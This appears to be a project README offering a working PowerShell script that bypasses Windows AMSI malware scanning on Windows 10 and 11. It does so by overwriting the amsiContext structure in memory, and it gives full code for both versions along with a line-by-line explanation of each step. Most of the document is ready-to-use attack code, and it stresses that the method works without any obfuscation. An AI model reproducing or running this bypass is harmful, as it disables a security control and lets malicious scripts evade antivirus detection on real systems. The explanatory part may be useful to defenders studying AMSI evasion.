# AMSI-Bypass-Win10-11
Simple script to bypass AMSI on Win 10 and Win 11 by exploiting AmsiOpenSession.
While the very well known AmsiScanBuffer in memory patching technique takes some tweeking and obfuscation to work, this method (at time of writing) works straight out of the box.
Lots of people to thank for all the tech info so a full write up with screenshots\references\blog posts is in the works.

<b>Win 10 Version</b>

```
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};
$d=$c.GetFields(‘NonPublic,Static’);
Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```      

<b>Win 11 Version</b>
```
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};
$d=$c.GetFields(‘NonPublic,Static’);
Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};
$g=$f.GetValue($null);
$buf = New-Object byte[](8);
$ptr= [System.IntPtr]::Add([System.IntPtr]$g, 0x8);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
```
# Whats actually happening here? (Win10 Version)
AmsioOpenSession compares the first 4 bytes of amsiContext to the HEX value equivalent of 'AMSI'. If this operation fails it jumps to the code block 
```mov eax, 80070057h``` 
\
80070057h = E_INVALIDARG
\
This bypasses all scans while that PowerShell process is running.
 
## Explaination of Code

Retrieve all the types from the currently executing assembly
```
$a=[Ref].Assembly.GetTypes();
```
(Look for amsiUtils) Iterate over each type in $a. If the type's name matches the pattern *iUtils assign that type to the variable $c
```
Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};
```
Get all non-public static fields of the type stored in $c and assigns them to $d    
```
$d=$c.GetFields(‘NonPublic,Static’);
```
(Look for amsiContext) Iterate over each field in $d. If the field's name matches the pattern *Context assign that field to the variable $f
```
Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};
```
Retrieves the value of the static field stored in $f     
```
$g=$f.GetValue($null);
```
Cast the value of $g to an IntPtr type and assign it to $ptr 
```
[IntPtr]$ptr=$g;
```
Create an array of integers with a single element 0 and assigns it to $buf 
 ```
[Int32[]]$buf = @(0);
```
Copy the value 0 from the array $buf to the memory location pointed to by $ptr  
```
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```      


